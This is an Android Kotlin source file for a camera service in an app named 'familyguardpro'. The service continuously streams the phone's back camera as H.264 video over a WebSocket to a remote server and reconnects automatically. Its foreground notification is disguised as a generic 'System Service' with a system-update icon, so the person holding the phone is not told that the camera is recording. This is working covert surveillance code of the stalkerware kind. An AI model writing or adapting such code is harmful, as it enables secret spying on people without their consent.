package com.familyguardpro.services

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.media.MediaCodec
import android.media.MediaCodecInfo
import android.media.MediaFormat
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.Log
import android.util.Size
import android.view.Surface
import androidx.core.app.NotificationCompat
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.R
import com.familyguardpro.network.ApiClient
import com.familyguardpro.utils.PreferenceManager
import kotlinx.coroutines.*
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import java.net.URI
import java.nio.ByteBuffer

class CameraService : Service() {

    companion object {
        private const val TAG = "CameraService"
        private const val NOTIFICATION_ID = 1003
        
        // Optimized for bandwidth
        private const val VIDEO_WIDTH = 854
        private const val VIDEO_HEIGHT = 480
        private const val FRAME_RATE = 15
        private const val BIT_RATE = 400_000 // 400 kbps
        private const val I_FRAME_INTERVAL = 5
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var preferenceManager: PreferenceManager
    
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var backgroundHandler: Handler? = null
    private var backgroundThread: HandlerThread? = null
    
    private var encoder: MediaCodec? = null
    private var encoderSurface: Surface? = null
    private var webSocketClient: WebSocketClient? = null
    private var isStreaming = false

    override fun onCreate() {
        super.onCreate()
        preferenceManager = PreferenceManager(this)
        startBackgroundThread()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground()
        startStreaming()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        stopStreaming()
        stopBackgroundThread()
    }

    private fun startForeground() {
        val notification = NotificationCompat.Builder(this, FamilyGuardApp.NOTIFICATION_CHANNEL_STREAMING)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(R.drawable.ic_system_update)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
        
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification, 
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraBackground").also { it.start() }
        backgroundHandler = Handler(backgroundThread!!.looper)
    }

    private fun stopBackgroundThread() {
        backgroundThread?.quitSafely()
        try {
            backgroundThread?.join()
            backgroundThread = null
            backgroundHandler = null
        } catch (e: InterruptedException) {
            Log.e(TAG, "Error stopping background thread", e)
        }
    }

    private fun startStreaming() {
        if (isStreaming) return
        isStreaming = true
        
        // Connect WebSocket first
        connectWebSocket {
            // Then initialize encoder and camera
            initEncoder()
            openCamera()
        }
    }

    private fun stopStreaming() {
        isStreaming = false
        
        captureSession?.close()
        captureSession = null
        
        cameraDevice?.close()
        cameraDevice = null
        
        imageReader?.close()
        imageReader = null
        
        encoder?.stop()
        encoder?.release()
        encoder = null
        
        encoderSurface?.release()
        encoderSurface = null
        
        webSocketClient?.close()
        webSocketClient = null
    }

    private fun connectWebSocket(onConnected: () -> Unit) {
        val baseUrl = ApiClient.BASE_URL
            .trimEnd('/')
            .replace("https://", "wss://")
            .replace("http://", "ws://")
        
        val deviceId = preferenceManager.getDeviceId()
        val sessionId = "${deviceId}_camera"
        val wsUrl = "$baseUrl/ws?session=$sessionId&role=sender&deviceId=$deviceId&type=camera"
        
        Log.d(TAG, "Connecting to WebSocket: $wsUrl")
        
        webSocketClient = object : WebSocketClient(URI(wsUrl)) {
            override fun onOpen(handshakedata: ServerHandshake?) {
                Log.d(TAG, "WebSocket connected")
                onConnected()
            }

            override fun onMessage(message: String?) {}

            override fun onClose(code: Int, reason: String?, remote: Boolean) {
                Log.d(TAG, "WebSocket closed: $reason")
                if (isStreaming) {
                    // Reconnect
                    serviceScope.launch {
                        delay(2000)
                        if (isStreaming) connectWebSocket(onConnected)
                    }
                }
            }

            override fun onError(ex: Exception?) {
                Log.e(TAG, "WebSocket error", ex)
            }
        }
        
        webSocketClient?.connect()
    }

    private fun initEncoder() {
        try {
            val format = MediaFormat.createVideoFormat(
                MediaFormat.MIMETYPE_VIDEO_AVC,
                VIDEO_WIDTH,
                VIDEO_HEIGHT
            ).apply {
                setInteger(MediaFormat.KEY_COLOR_FORMAT, 
                    MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface)
                setInteger(MediaFormat.KEY_BIT_RATE, BIT_RATE)
                setInteger(MediaFormat.KEY_FRAME_RATE, FRAME_RATE)
                setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, I_FRAME_INTERVAL)
                setInteger(MediaFormat.KEY_PROFILE, MediaCodecInfo.CodecProfileLevel.AVCProfileBaseline)
                setInteger(MediaFormat.KEY_LEVEL, MediaCodecInfo.CodecProfileLevel.AVCLevel31)
            }
            
            encoder = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC)
            encoder?.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
            encoderSurface = encoder?.createInputSurface()
            
            encoder?.setCallback(object : MediaCodec.Callback() {
                override fun onInputBufferAvailable(codec: MediaCodec, index: Int) {}
                
                override fun onOutputBufferAvailable(codec: MediaCodec, index: Int, info: MediaCodec.BufferInfo) {
                    try {
                        val buffer = codec.getOutputBuffer(index)
                        buffer?.let {
                            val data = ByteArray(info.size)
                            it.get(data)
                            sendEncodedFrame(data, info)
                        }
                        codec.releaseOutputBuffer(index, false)
                    } catch (e: Exception) {
                        Log.e(TAG, "Error processing output buffer", e)
                    }
                }

                override fun onError(codec: MediaCodec, e: MediaCodec.CodecException) {
                    Log.e(TAG, "Encoder error", e)
                }

                override fun onOutputFormatChanged(codec: MediaCodec, format: MediaFormat) {
                    Log.d(TAG, "Encoder format changed: $format")
                    // Send SPS/PPS
                    val sps = format.getByteBuffer("csd-0")
                    val pps = format.getByteBuffer("csd-1")
                    sps?.let { sendConfigData(it) }
                    pps?.let { sendConfigData(it) }
                }
            }, backgroundHandler)
            
            encoder?.start()
            Log.d(TAG, "Encoder initialized")
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize encoder", e)
        }
    }

    @SuppressLint("MissingPermission")
    private fun openCamera() {
        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        
        try {
            // Find back camera
            val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                val characteristics = cameraManager.getCameraCharacteristics(id)
                characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
            } ?: cameraManager.cameraIdList.first()
            
            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    createCaptureSession()
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    cameraDevice = null
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "Camera error: $error")
                    camera.close()
                    cameraDevice = null
                }
            }, backgroundHandler)
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open camera", e)
        }
    }

    private fun createCaptureSession() {
        val camera = cameraDevice ?: return
        val surface = encoderSurface ?: return
        
        try {
            camera.createCaptureSession(
                listOf(surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        captureSession = session
                        startPreview()
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "Capture session configuration failed")
                    }
                },
                backgroundHandler
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create capture session", e)
        }
    }

    private fun startPreview() {
        val camera = cameraDevice ?: return
        val session = captureSession ?: return
        val surface = encoderSurface ?: return
        
        try {
            val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                addTarget(surface)
                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                set(CaptureRequest.CONTROL_AE_TARGET_FPS_RANGE, android.util.Range(FRAME_RATE, FRAME_RATE))
            }
            
            session.setRepeatingRequest(
                captureRequest.build(),
                null,
                backgroundHandler
            )
            
            Log.d(TAG, "Camera preview started")
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start preview", e)
        }
    }

    private fun sendEncodedFrame(data: ByteArray, info: MediaCodec.BufferInfo) {
        if (webSocketClient?.isOpen != true) return
        
        try {
            // Add frame type header (1 byte: 0 = P-frame, 1 = I-frame)
            val isKeyFrame = (info.flags and MediaCodec.BUFFER_FLAG_KEY_FRAME) != 0
            val frameData = ByteArray(data.size + 1)
            frameData[0] = if (isKeyFrame) 1 else 0
            System.arraycopy(data, 0, frameData, 1, data.size)
            
            webSocketClient?.send(frameData)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send frame", e)
        }
    }

    private fun sendConfigData(buffer: ByteBuffer) {
        if (webSocketClient?.isOpen != true) return
        
        try {
            val data = ByteArray(buffer.remaining())
            buffer.get(data)
            
            // Config data header (2 = config)
            val configData = ByteArray(data.size + 1)
            configData[0] = 2
            System.arraycopy(data, 0, configData, 1, data.size)
            
            webSocketClient?.send(configData)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send config data", e)
        }
    }
}
